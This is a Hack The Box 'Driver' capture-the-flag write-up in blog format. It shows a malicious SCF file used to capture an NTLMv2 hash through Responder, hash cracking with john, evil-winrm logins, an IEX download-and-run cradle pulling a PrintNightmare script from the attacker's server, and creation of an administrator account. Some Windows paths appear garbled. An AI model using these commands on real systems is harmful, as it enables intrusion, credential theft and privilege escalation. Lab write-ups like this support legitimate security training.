@@ -1,0 +1,265 @@
+---
+title: Hackthebox Driver Writeup
+slug: hackthebox-driver-writeup
+description: Hackthebox release new machine called driver, in this machine we have permission to upload Firmware Update and we abuse that permission with SMB Share SCF File Attacks and get the hash of tony user crack that hash and login with his account with help of evil-winrm and for privesc i use PrintNightmare LPE exploit for generate user as administrator and login with that user with help of evil-winrm.
+date: 2021-10-04
+image: hackthebox-driver-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 00:11 CDT
+Nmap scan report for 10.10.11.106
+Host is up (0.086s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+135/tcp open  msrpc        Microsoft Windows RPC
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-10-03T12:11:52
+|_  start_date: 2021-10-03T11:42:52
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 54.64 seconds
+```
+
+There are three ports open `80:http,135:RPC,445:SMB`
+
+Let's start with `RPC` enumeration.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver]
+└──╼ [★]$ rpcdump.py @10.10.11.106
+Impacket v0.9.23.dev1+20210416.153120.efbe78bb - Copyright 2020 SecureAuth Corporation
+
+[*] Retrieving endpoint list from 10.10.11.106
+Protocol: [MS-RSP]: Remote Shutdown Protocol
+Provider: wininit.exe
+UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
+Bindings:
+          ncacn_ip_tcp:10.10.11.106[49408]
+          ncalrpc:[WindowsShutdown]
+          ncacn_np:\DRIVER[PIPEInitShutdown]
+          ncalrpc:[WMsgKRpc07AFF0]
+
+Protocol: N/A
+Provider: winlogon.exe
+UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0
+Bindings:
+          ncalrpc:[WindowsShutdown]
+          ncacn_np:\DRIVER[PIPEInitShutdown]
+          ncalrpc:[WMsgKRpc07AFF0]
+          ncalrpc:[WMsgKRpc07C601]
+
+--------------snip-------------------
+
+[*] Received 464 endpoints.
+```
+
+We use `PrintNightmare` exploit against `Print System Remote Protocol` but for that we need user `creads` so let's move further.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-driver-writeup' />
+
+Same with the `smb` we need creads for `listing` the shares.
+
+## Port-80
+
+When we go to the `ip` it's asking for `username` and `passsword`.
+
+<FixTheImageURL src='web.png' slug='hackthebox-driver-writeup' />
+
+I try `default` creads like `admin:admin` and it's `work`.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-driver-writeup' />
+
+We are inside `home` page.
+
+<FixTheImageURL src='web2.png' slug='hackthebox-driver-writeup' />
+
+When i go inside `Firmware` Updates there is a option for `uploading` firmware and the name of the site is `MFP Firmware Update Center`.
+
+We can search any `exploit` for that `related` name.
+
+<FixTheImageURL src='web3.png' slug='hackthebox-driver-writeup' />
+
+I can't find any `exploit` for that related name but we can `imagine` that when we `upload` the file the `server` saves the file inside `smb` share.
+
+So rather `searching` for exploit we can try `SCF File Attacks`.
+
+Link : https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+Create a file called `@exploit.scf` and change the `ip`.
+
+## @exploit.scf
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver]
+└──╼ [★]$ cat @exploit.scf
+[Shell]
+Command=2
+IconFile=\10.10.14.116sharepentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+After that start the `responder` for capturing the `hashes`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver]
+└──╼ [★]$ responder -wrf --lm -v -I tun0
+```
+
+Upload the `scf` file and click on `submit`.
+
+<FixTheImageURL src='web4.png' slug='hackthebox-driver-writeup' />
+
+Now check your `responder` we got the hash `captured`
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-driver-writeup' />
+
+```js
+[SMB] NTLMv2 Client   : 10.10.11.106
+[SMB] NTLMv2 Username : DRIVER	ony
+[SMB] NTLMv2 Hash     : tony::DRIVER:6f09da70e73b9237:674092FE6EC25CB23CBB01D554A9B854:0101000000000000DEB3B39E53B8D70144991278610991070000000002000400270027000000000000000000
+```
+
+Now let's crack the `hash` with `john`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver]
+└──╼ [★]$ john hash -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+liltony          (tony)
+1g 0:00:00:00 DONE (2021-10-03 00:42) 10.00g/s 327680p/s 327680c/s 327680C/s softball27..eatme1
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+```
+
+Now we have the `passsword` let's use `evil-winrm` to login inside machine and get the `user.txt`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver]
+└──╼ [★]$ evil-winrm -i 10.10.11.106 -u tony -p liltony
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:/Users/tony/Documents> type ../Desktop/user.txt
+4936df48c2c5217ac7e9b78f5a70c45a
+*Evil-WinRM* PS C:/Users/tony/Documents>
+```
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-driver-writeup' />
+
+## Privilege escalation
+
+Now we are inside the `machine` and we also have creads so let's use `PrintNightmare exploit` because we see in the `rpcdump` `Print System Remote Protocol` is enabled.
+
+Link : https://github.com/calebstewart/CVE-2021-1675
+
+Let's upload the `ps1` script with help of `evil-winrm`.
+
+```js
+*Evil-WinRM* PS C:/Users/tony/Desktop> upload /root/Desktop/HTB/Driver/CVE-2021-1675.ps1
+Info: Uploading /root/Desktop/HTB/Driver/CVE-2021-1675.ps1 to C:/Users/tony/Desktop/CVE-2021-1675.ps1
+
+Data: 238080 bytes of 238080 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:/Users/tony/Desktop>
+```
+
+But we can't `import` the script becuase `ExecutionPolicy` is `Restricted`.
+
+```js
+*Evil-WinRM* PS C:/Users/tony/Desktop> Import-Module .\cve-2021-1675.ps1
+File C:/Users/tony/Desktop/cve-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ Import-Module ./cve-2021-1675.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
+*Evil-WinRM* PS C:/Users/tony/Desktop>
+```
+
+We can `conform` that with the help of `Get-ExecutionPolicy` command.
+
+```js
+*Evil-WinRM* PS C:\Users\tony\Desktop> Get-ExecutionPolicy
+Restricted
+*Evil-WinRM* PS C:\Users\tony\Desktop>
+```
+
+So we can `bypass` that with the help of `download` the file with help of `IEX` command.
+
+The `advantage` of this command is it's `automatically` import the file after `download`.
+
+Let's start the `python` server.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver/www]
+└──╼ [★]$ ls
+CVE-2021-1675.ps1
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver/www]
+└──╼ [★]$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Now let's `download` the file with `IEX` command.
+
+```js
+*Evil-WinRM* PS C:Users	onyDesktop > IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.116/CVE-2021-1675.ps1')
+```
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-driver-writeup' />
+
+Now it's imported `automatically` let's create new user with `Invoke-Nightmare` command.
+
+```js
+*Evil-WinRM* PS C:Users	onyDesktop > Invoke-Nightmare -NewUser "dedsec" -NewPassword "dedsec@123"
+```
+
+now `connect` to the machine with new `username and passsword` and get `root.txt`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Driver/www]
+└──╼ [★]$ evil-winrm -i 10.10.11.106 -u dedsec -p dedsec@123
+```
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-driver-writeup' />
